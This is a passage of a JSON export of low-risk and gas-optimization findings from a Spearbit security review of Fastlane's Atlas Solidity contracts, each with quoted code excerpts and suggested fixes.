        "body": "If _validateSolverOperation() fails then _handleAltOpHash() is still executed. There are two main reasons for _validateSolverOperation() to fail:  block.number related. Error with block.number don't seem to be good reason to still do _handleAl- tOpHash() because this prevents executing the solverOp on a later moment in time. Note: also see a suggestion to move the block.number related checks in issue \"Difference between Sorter and Atlas functions\".  Gas related. This might be a good reason. In _executeSolverOperation(), when _handleAltOpHash() fails then the result of _validateSolverOpera- tion() is returned an no additional error bit for the failing of _handleAltOpHash() is set. 52 function _getBidAmount(/*...*/ ) /*...*/ { // ... (result, gasLimit) = _validateSolverOperation(dConfig, solverOp, gasWaterMark, result); if (dConfig.callConfig.allowsTrustedOpHash()) { if (!_handleAltOpHash(userOp, solverOp)) { return (0); } } // ... } function _executeSolverOperation(/*...*/ ) /*...*/ { // ... (result, gasLimit) = _validateSolverOperation(dConfig, solverOp, gasWaterMark, result); if (dConfig.callConfig.allowsTrustedOpHash()) {  if (!prevalidated && !_handleAltOpHash(userOp, solverOp)) { // doesn t add its own error bit key.solverOutcome = uint24(result); // result is off the previous action return (false, key); } } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unreachable code in _assign()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _assign() can be called from _releaseSolverLock() and _settle(). In both cases amount will not be 0. See pieces of code below. This means the code if (amount == 0) { ... } will never be executed. This is fortunate though because:  _bidFindingIteration() calls _getBidAmount(), which calls _releaseSolverLock() which calls _assign().  _assign() would maybe set lastAccessedBlock == block.number.  Then _bidFindingIteration() continues and calls _executeSolverOperation() which calls _validate- SolverOperation().  _validateSolverOperation() checks lastAccessedBlock == block.number, which would be true now and result in an error. 53 function _assign(address owner, uint256 amount, bool solverWon, bool bidFind) internal returns (bool ,! isDeficit) { if (amount == 0) { accessData[owner].lastAccessedBlock = uint32(block.number); // still save on bidFind } else { // ... if (!bidFind) { aData.lastAccessedBlock = uint32(block.number); } } } uint256 gasWaterMark = gasleft(); function _releaseSolverLock(/*...*/ , uint256 gasWaterMark, /*...*/ ) /*...*/ { // ... uint256 gasUsed = (gasWaterMark - gasleft() + 5000) * tx.gasprice; // other action to increase gasUsed _assign(/*...*/ , gasUsed, /*...*/ ); // gasUsed at least 5000 * tx.gasprice // ... } function _settle(/*...*/ ) /*...*/ { // ... if (_deposits < _claims + _withdrawals) { uint256 amountOwed = _claims + _withdrawals - _deposits; if (_assign(/*...*/ , amountOwed, /*...*/ )) { /*...*/ } // amountOwed > 0 otherwise doesn  t end up here } // ... ,! }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_removeSignatory() can silently fail",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The _removeSignatory() function has the following implementation: function _removeSignatory(address controller, address signatory) internal { bytes32 signatoryKey = keccak256(abi.encodePacked(controller, signatory)); delete signatories[signatoryKey]; for (uint256 i = 0; i < dAppSignatories[controller].length; i++) { if (dAppSignatories[controller][i] == signatory) { dAppSignatories[controller][i] = ,! dAppSignatories[controller][dAppSignatories[controller].length - 1]; dAppSignatories[controller].pop(); break; } } } This code does not check that the signatory is indeed a signatory for the controller in question. Since re- moveSignatory() can be called by arbitrary signatory addresses, and since _addSignatory() does have extra sanity checks, it would make sense to enforce that the signatory actually exists before removing it. 54 Note: changeDAppGovernance() does have this additional check : function changeDAppGovernance(address oldGovernance, address newGovernance) external { // ... if (!signatories[signatoryKey]) revert AtlasErrors.DAppNotEnabled(); _removeSignatory(controller, oldGovernance); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "ChainlinkAtlasWrapper sanity check can be stronger",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In the ChainlinkAtlasWrapper, the following code determines the median observation, and ensures the observation is a positive value: // Check observations are ordered, then take median observation for (uint256 i = 0; i < r.observations.length - 1; ++i) { bool inOrder = r.observations[i] <= r.observations[i + 1]; if (!inOrder) revert ObservationsNotOrdered(); } int192 median = r.observations[r.observations.length / 2]; if (median <= 0) revert AnswerMustBeAboveZero(); Since it's enforced that the median is a positive value, it is likely that all observations should be positive, which is currently not checked. 55",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Unused DAppOperation fields",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The DAppOperation struct has the following definition: struct DAppOperation { address from; // signor address address to; // Atlas address uint256 value; uint256 gas; uint256 nonce; uint256 deadline; address control; // control address bundler; // msg.sender bytes32 userOpHash; // keccak256 of userOp.to, userOp.data bytes32 callChainHash; // keccak256 of the solvers bytes signature; txs  } Currently, the to, value, and gas fields are not used in the code (other than to contribute to the hash of the entire struct). As specified in the comments, the to address was likely meant to be checked to match the ATLAS address. The gas and value fields can likely be removed since different structs already cover this functionality.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "solverMetaTryCatch() should not have reverting external calls",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In both the _getBidAmount() and _executeSolverOperation() functions, a call to solverMeta- TryCatch() in the ExecutionEnvironment is made. In both cases, this call may revert, and the error message of this revert has important consequences (e.g. for determining simulated bid amounts, or for assigning blame for the revert). As a result, it's important that there are no external calls in solverMetaTryCatch() that can revert the entire call with an arbitrary error message. Currently, this is a risk with the call to ERC20(solverOp.bidToken).balanceOf(address(this)), since it is not wrapped in a try-catch block, and solverOp.bidToken can be an arbitrary contract. So, for example, a malicious ERC20 token might revert with the AtlasErrors.BidFindSuccessful() error selector to spoof a fake bid amount. Users will likely not interact with malicious ERC20 implementations anyway, but this poses a risk if they do. It's also worth noting that several internal reverts can happen in solverMetaTryCatch(), for example, errors with abi.decode() or with arithmetic underflow/overflow. There is less risk in these cases, since these reverts have fixed error selectors and would be treated as a failure (in the case of _getBidAmount()) or as the generic Solver- Outcome.EVMError result (in the case of _executeSolverOperation()). 56",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "sessionKeys can't be expired",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The whitepaper contains: However ther is no (onchain) functionality to expire or revoke sessionKeys.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Workaround manuallyUpdateNonceTracker() might not work",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The loop in function getNextNonce() could run out of gas, although relatively unlikely. A workaround exist via manuallyUpdateNonceTracker(). However it is important that the caller is able to call this function. If the caller would be a smart contract, it might not be able to. function getNextNonce(address account, bool sequenced) external view returns (uint256) { // ... do { } unchecked { ++n; bytes32 bitmapKey = keccak256(abi.encode(account, nonceTracker.highestFullAsyncBitmap + n)); NonceBitmap memory nonceBitmap = nonceBitmaps[bitmapKey]; bitmap256 = uint256(nonceBitmap.bitmap); } while (bitmap256 == FULL_BITMAP); // ... } function manuallyUpdateNonceTracker(address account) external { // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_getMimicCreationCode relies on Solidity format for offsets",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In function _getMimicCreationCode() the mstores are done on very specific locations, recognizable by the statements add(creationCode, 85). So this function relies highly on the compiled solidity code and thus on the exact compiler version and optimization settings. Any updates in these require a change in _getMimicCre- ationCode() and it is easy to make mistakes. function _getMimicCreationCode(/*...*/ ) /*...*/ { // ... creationCode = type(Mimic).creationCode; assembly { mstore( add(creationCode, 85), or( and(mload(add(creationCode, 85)), not(shl(96, ,! 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))), shl(96, executionLib) ) ) mstore( add(creationCode, 118), or( ,! 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF))), and(mload(add(creationCode, 118)), not(shl(96, shl(96, user) ) ) mstore( add(creationCode, 139), or( and( mload(add(creationCode, 139)), not(shl(56, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFF)) ), add(shl(96, controller), add(shl(88, 0x63), shl(56, callConfig))) ) ) mstore(add(creationCode, 165), controlCodeHash) } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "_getMimicCreationCode relies on Solidity format for layout",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In function _getMimicCreationCode(), the add(shl(88, 0x63) ..) is redundant, because its al- ready kept by the mask with 00 above. With the applied compiler version, this value in the Mimic code is 0x63. In that case, OR-ing it with 0x63 results in the same value. However it costs additional gas and with other Solidity versions this value might change. function _getMimicCreationCode(/*...*/ ) /*...*/ { // ... mstore( add(creationCode, 139), or( and( mload(add(creationCode, 139)), not(shl(56, 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF00FFFFFFFF)) // note the 00 ), add(shl(96, controller), add(shl(88, 0x63), shl(56, callConfig))) ) ) mstore(add(creationCode, 165), controlCodeHash) } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Return a tuple of (preOpsReturnData, userReturnData) in _preOpsUserExecutionIteration()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "returnData returned by _preOpsUserExecutionIteration() means different things in different con- text: needsPreOpsCall && needsPreOpsReturnData needsUserReturnData returnData F F T T F T F T empty userReturnData preOpsReturnData preOpsReturnData++userReturnData We modified this function a bit to test difference cases. For this case:  needsPreOpsCall = T, needsPreOpsReturnData = F, needsUserReturnData = F, even if the function returns preOpsReturnData (instead of empty), the test cases pass. That indicates either a lack of coverage or a bug in the code.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "WETH_X_GOVERNANCE_POOL may not have governance token",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The following check doesn't protect against the case when governance token isn't part of the pool. It only ensures that at least one of the tokens is WETH. govIsTok0 = (IUniswapV2Pair(WETH_X_GOVERNANCE_POOL).token0() == GOVERNANCE_TOKEN); if (govIsTok0) { require(IUniswapV2Pair(WETH_X_GOVERNANCE_POOL).token1() == WETH, \"INVALID TOKEN PAIR\"); } else { require(IUniswapV2Pair(WETH_X_GOVERNANCE_POOL).token0() == WETH, \"INVALID TOKEN PAIR\"); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "metacall() doesn't always use netGasSurcharge",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In function metacall(), when a solver has won the auction then a netGasSurcharge is withheld and an emit is done. When an error occurs, then netGasSurcharge isn't withheld and no emit is done, even if metacall() doesn't revert itself. Adding a netGasSurcharge might be useful to prevent spam transactions. function metacall(/*...*/ ) /*...*/ { // ... try this.execute{ value: msg.value }(/*...*/ ) returns (/*...*/ ) { (uint256 ethPaidToBundler, uint256 netGasSurcharge) = _settle({ /*...*/ }); emit MetacallResult(/*...*/ , ethPaidToBundler, netGasSurcharge); ); } catch (bytes memory revertData) { if (msg.value != 0) SafeTransferLib.safeTransferETH(msg.sender, msg.value); // send to bundler // no netGasSurcharge // no emit } // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Use tryRecover() for signature verification",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "recover() reverts if the recovered signature is address(0) which is the case for invalid signatures. So call validation reverts instead of bubbling up the error. These function is called via metacall() which isn't supposed to revert as per this comment: // Gracefully return if not valid. This allows signature data to be stored, which helps prevent // replay attacks. // NOTE: Currently reverting instead of graceful return to help w/ testing. TODO - still reverting? (bytes32 userOpHash, ValidCallsResult validCallsResult) = ,! IAtlasVerification(VERIFICATION).validateCalls( dConfig, userOp, solverOps, dAppOp, msg.value, msg.sender, isSimulation ); A single invalid signature from solver can revert the entire execute and prevent userOp to be executed. Although this invalid signature shouldn't land onchain for actual execution as it should be caught in simulation. ERC-4337 has the same requirement for signature failures. Note: some of the example use ecrecover(). This returns 0 when the signatures don't match which might go undetected.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Disposable sessionKeys might be deleted too soon",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The bundler can be a (disposable) sessionKey, which can receive ETH from metacall(). After this sessionKey is disposed of, the ETH is no longer available. function metacall(/*...*/ ) /*...*/ { // ... // Refund the msg.value to sender if it errored if (msg.value != 0) SafeTransferLib.safeTransferETH(msg.sender, msg.value); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "OR operator is used instead of AND operator",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "SwapIntent.swap() function does a require check and then uses the same condition in the if condition: require(swapIntent.tokenUserSells != swapIntent.auctionBaseCurrency, \"ERR-PI008 SellIsSurplus\"); // ... if ( swapIntent.auctionBaseCurrency != swapIntent.tokenUserSells || swapIntent.auctionBaseCurrency != swapIntent.tokenUserBuys ) { Regardless of the require check, (a != c || a != b) is always true. This if condition is meant to be an AND instead of OR.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Calls to AtlETH functions not restricted",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Several functions of AtlETH could potentially be called during a metacall(), possibly while execution is given to another contract with a safeTransferETH() call. This could interfere with the functionality of Atlas which relies on the AtlETH information to stay the same. Also see the issue \"Call to safeTransferETH can do unwanted actions\".",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Call to safeTransferETH can do unwanted actions",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "metacall() and _settle() do an safeTransferETH() to the bundler. The bundler can intercept this call via an receive() and do one of the following unwanted actions:  Do revert(). In that case the original call will also revert, see Solmate SafeTransferLib. This way for example the transactions of specific solvers could be reverted. Note: When reuseUserOp == false then reverts should be avoided.  Call reconcile(), see issue \"Reconcile() can be called by anyone\".  Call functions of AtlETH, see issue \"Calls to AtlETH functions not restricted\". function metacall(/*...*/ ) /*...*/ { // ... try this.execute{ value: msg.value }(/*...*/ ) // ... } catch (bytes memory revertData) { // ... if (msg.value != 0) SafeTransferLib.safeTransferETH(msg.sender, msg.value); // bundler } // ... } function _settle(/*...*/ ) /*...*/ { // ... SafeTransferLib.safeTransferETH(bundler, _claims); // ... } these scenarios would give the bundler control flow after Also, note that the final checks on de- posits/withdrawals/claims, but before the main Atlas lock is released. This is a potentially dangerous location to give control flow, as any fund transfers would be untracked. Fortunately, this is not exploitable because, for example, the ExecutionEnvironment currently can't reach a delegatecall without entering Atlas first. However, eliminating this dangerous external call could help prevent future issues if the code is changed.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Low Risk"
        ]
    },
    {
        "title": "Include simulation mode information as custom error argument",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "wherever isSimulation is used, the code is always reverting except at Atlas.sol#L133-L135 where the execution can still continue. To remove the if/else branch on reverts conditioned on isSimulation - a custom error, which takes isSimulation as an argument, can be used. It simplifies the code.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_deduct() reverts can be improved",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function _deduct() reverts with a generic error if aData.unbonding < _shortfall, while in other situations it has a specific error. The revert InsufficientBalanceForDeduction() could get the balance in a cheaper way. function _deduct(address account, uint256 amount) internal { uint112 amt = uint112(amount); EscrowAccountBalance memory aData = _balanceOf[account]; uint112 balance = aData.balance; if (amt <= balance) { // ... } else if (block.number > accessData[account].lastAccessedBlock + ESCROW_DURATION) { uint112 _shortfall = amt - balance; // ... aData.unbonding -= _shortfall; // underflow here to revert if insufficient balance // ... } else { revert InsufficientBalanceForDeduction(_balanceOf[account].balance, amount); } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Code duplication in initializeGovernance()",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "initializeGovernance() function duplicates the code of _addSignatory(). The only difference is the error message. function initializeGovernance(address controller) external { // ... // Add DAppControl gov as a signatory bytes32 signatoryKey = keccak256(abi.encodePacked(controller, msg.sender)); if (signatories[signatoryKey]) revert AtlasErrors.OwnerActive(); signatories[signatoryKey] = true; dAppSignatories[controller].push(msg.sender); ... } function _addSignatory(address controller, address signatory) internal { bytes32 signatoryKey = keccak256(abi.encodePacked(controller, signatory)); if (signatories[signatoryKey]) revert AtlasErrors.SignatoryActive(); signatories[signatoryKey] = true; dAppSignatories[controller].push(signatory); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "ExecutionBase functions contain redundant checks",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The functions _contribute(), _borrow(), _transferUserERC20() and _transferDAppERC20() check msg.sender == atlas however the value of this is limited. The real access control check is on the receiving side, e.g. in contribute(), borrow(), transferUserERC20() and transferDAppERC20(). 65 function _contribute(uint256 amt) internal { if (msg.sender != atlas) revert AtlasErrors.OnlyAtlas(); // ... IEscrow(atlas).contribute{ value: amt }(); } function _borrow(uint256 amt) internal { if (msg.sender != atlas) revert AtlasErrors.OnlyAtlas(); IEscrow(atlas).borrow(amt); } function _transferUserERC20(address token, address destination, uint256 amount) internal { if (msg.sender != atlas) { revert AtlasErrors.OnlyAtlas(); } IPermit69(atlas).transferUserERC20(token, destination, amount, _user(), _control(), _config(), _lockState()); ,! } function _transferDAppERC20(address token, address destination, uint256 amount) internal { if (msg.sender != atlas) { revert AtlasErrors.OnlyAtlas(); } IPermit69(atlas).transferDAppERC20(token, destination, amount, _user(), _control(), _config(), _lockState()); ,! } Functions in Atlas: function contribute() external payable { if (lock != msg.sender) revert InvalidExecutionEnvironment(lock); // ... } function borrow(uint256 amount) external payable { if (lock != msg.sender) revert InvalidExecutionEnvironment(lock); // ... } function transferUserERC20(...) ... { _verifyCallerIsExecutionEnv(user, controller, callConfig); // ... } function transferDAppERC20(...) ... { _verifyCallerIsExecutionEnv(user, controller, callConfig); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "latestTimestamp() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function latestTimestamp() calls BASE_FEED.latestTimestamp() twice. storage variable atlasLatestTimestamp twice, which is relatively expensive. This can be optimized. It also accesses the uint256 public atlasLatestTimestamp; function latestTimestamp() public view returns (uint256) { if (BASE_FEED.latestTimestamp() >= atlasLatestTimestamp) { return BASE_FEED.latestTimestamp(); // second call } else { return atlasLatestTimestamp; // second access } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_getSortingData() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "_verifySolverEligibility() is called in a loop and every time calls getUserOperationHash(). As getUserOperationHash() is a relative expensive function and the input is always the same, it would be cheaper to do this outside the loop. function _getSortingData(/*...*/ ) /*...*/ { // ... for (; i < count;) { if (/*...*/ && _verifySolverEligibility(dConfig, userOp, solverOps[i])) { // ... } else { // ... } // ... } // ... } function _verifySolverEligibility(/*...*/ ) /*...*/ { // ... bytes32 userOpHash = CallVerification.getUserOperationHash(userOp); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "sortBids() can be optimized",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function sortBids() calculates count -invalid twice. This can be optimized, while also increases readability. function sortBids(/*...*/ ) /*...*/ { // ... SolverOperation[] memory solverOpsSorted = new SolverOperation[](count - invalid); count -= invalid; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "factoryWithdrawERC20() and factoryWithdrawEther() are unused",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The functions factoryWithdrawERC20() and factoryWithdrawEther() are not called from Atlas. Note: they could be called via a userOp in combination with delegatecall and this issue: \"validControl / only- AtlasEnvironment are not effective in delegatecall situation\". This poses no extra risk because the ExecutionEnvironment call already can access the funds. function factoryWithdrawERC20(address msgSender, address token, uint256 amount) external { require(msg.sender == atlas, \"ERR-EC10 NotFactory\"); require(msgSender == _user(), \"ERR-EC11 NotEnvironmentOwner\"); require(ISafetyLocks(atlas).isUnlocked(), \"ERR-EC15 EscrowLocked\"); if (ERC20(token).balanceOf(address(this)) >= amount) { SafeTransferLib.safeTransfer(ERC20(token), _user(), amount); } else { revert(\"ERR-EC02 BalanceTooLow\"); } } function factoryWithdrawEther(address msgSender, uint256 amount) external { require(msg.sender == atlas, \"ERR-EC10 NotFactory\"); require(msgSender == _user(), \"ERR-EC11 NotEnvironmentOwner\"); require(ISafetyLocks(atlas).isUnlocked(), \"ERR-EC15 EscrowLocked\"); if (address(this).balance >= amount) { SafeTransferLib.safeTransferETH(_user(), amount); } else { revert(\"ERR-EC03 BalanceTooLow\"); } } 68",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Moving validateBalances() to Atlas",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Currently there is some back and forth calling between the ExecutionEnvironment, the Solver and Altas. This is complicated, has overhead and is potentially risky. function solverMetaTryCatch( // Execute the solver call. // which calls  IEscrow(_atlas).reconcile  if (endBalance > 0) { IEscrow(atlas).contribute{ value: endBalance }(); } (, success) = IEscrow(atlas).validateBalances(); if (!success) { revert AtlasErrors.BalanceNotReconciled(); } }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "_executeSolverOperation() executes the same line twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In _executeSolverOperation() the statement key.solverOutcome = uint24(result) might be done twice in certain situations. 69 function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.canExecute()) { // ... if (result.canExecute() && _trySolverLock(solverOp)) { // ... key.solverOutcome = uint24(result); if (result.executionSuccessful()) { // ... return (true, key); } } } key.solverOutcome = uint24(result); // has been done before in certain situations // ... return (false, key); }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Assign with or operator (|=) can be reduced",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "In function _executeSolverOperation() result is verified to be 0 before calling _solverOpWrap- per(), so the or operator (|) is not necessary. function _executeSolverOperation(/*...*/ ) /*...*/ { // ... if (result.canExecute() && _trySolverLock(solverOp)) { // result is now 0 // ... result |= _solverOpWrapper(...); // | not necessary // ... } // ... } 70 In _validateSolverOperation() the value is returned directly so no need to first assign it to result. function _validateSolverOperation(/*...*/ ) /*...*/ { // ... return (result |= 1 << uint256(SolverOutcome.CallValueTooHigh), gasLimit); // = not necessary // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Parameter of manuallyUpdateNonceTracker() not necessary",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Function manuallyUpdateNonceTracker() enforces the parameter account to be equal msg.sender. In that case supplying account isn't necessary. to function manuallyUpdateNonceTracker(address account) external { if (msg.sender != account) revert AtlasErrors.OnlyAccount(); // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Nonce logic is complicated",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "The logic to handle async nonces is rather complicated and thus relative gas intensive. This is mainly done to be able to do getNextNonce() onchain. This approach is not foul proof either because one of the nonces might already be in transit without any onchain updates. Also see issues:  Workaround manuallyUpdateNonceTracker() might not work.  Function manuallyUpdateNonceTracker() can miss blocks that are not completely filled. 71 One example: function _handleNonces(address account, uint256 nonce, bool async, bool isSimulation) internal returns ,! (bool) { // ... // ASYNC NONCES uint256 bitmapIndex = ((nonce - 1) / 240) + 1; uint256 bitmapNonce = ((nonce - 1) % 240); bytes32 bitmapKey = keccak256(abi.encode(account, bitmapIndex)); NonceBitmap memory nonceBitmap = nonceBitmaps[bitmapKey]; uint256 bitmap = uint256(nonceBitmap.bitmap); if (_nonceUsedInBitmap(bitmap, bitmapNonce)) { return false; } // ... bitmap |= 1 << bitmapNonce; nonceBitmap.bitmap = uint240(bitmap); if (bitmapNonce + 1 > uint256(nonceBitmap.highestUsedNonce)) { nonceBitmap.highestUsedNonce = uint8(bitmapNonce + 1); } if (bitmap == FULL_BITMAP) { if (bitmapIndex == nonceTracker.highestFullAsyncBitmap + 1) { nonceTracker = _incrementHighestFullAsyncBitmap(nonceTracker, account); } } nonceBitmaps[bitmapKey] = nonceBitmap; // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "userWrapper() considers entire balance instead of msg.value",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "userWrapper() is called such that msg.value == userOp.value: (success, userData) = environment.call{ value: userOp.value }(userData); However, userWrapper() validates userOp.value against address(this).balance: require(address(this).balance >= userOp.value, \"ERR-CE01 ValueExceedsBalance\"); ExecutionEnvironment can have some ETH balance already since it as receive() function. Thus, address(this).balance >= msg.value. Reading address(this).balance is more expensive operation than reading msg.value. 72 Thus, checking against msg.value is technically more accurate and also cheaper.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "netGasSurcharge is declared twice",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "netGasSurcharge is a named return variable, but it's declared again later. function _settle(/*...*/ ) /*...*/ returns (/*...*/ , uint256 netGasSurcharge) { // ... uint256 netGasSurcharge = (_claims * SURCHARGE) / 10_000_000; // declared again // ... }",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Cache variables",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "Highlighted areas are where variables can be cached to avoid reading from storage more than once.  ChainlinkDAppControl.sol#L153: verificationVars[baseChainlinkFeed] can be extracted in a storage variable to avoid getting its value in each loop.  ChainlinkDAppControl.sol#L219: signers.length is read for each iteration.  ChainlinkDAppControl.sol#L206-L207: last signer is read twice.  SwapIntent.sol#L146-L150: swapIntent.conditions.length is read twice.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "No need to check for signature length",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
        "body": "there's no need for this check: if (dAppOp.signature.length == 0) return false; if (userOp.signature.length == 0) return false; recover() does this check already. If tryRecover() is used instead as suggested in the issue \"Use tryRecover() for signature verification\" is followedtryRecover(), it won't throw on invalid signature.",
        "labels": [
            "Spearbit",
            "Fastlane",
            "Severity: Gas Optimization"
        ]
    },
    {
        "title": "Only one ...get...Hash() function uses calldata",
        "html_url": "https://github.com/spearbit/portfolio/tree/master/pdfs/Fastlane-Spearbit-Security-Review-April-2024.pdf",
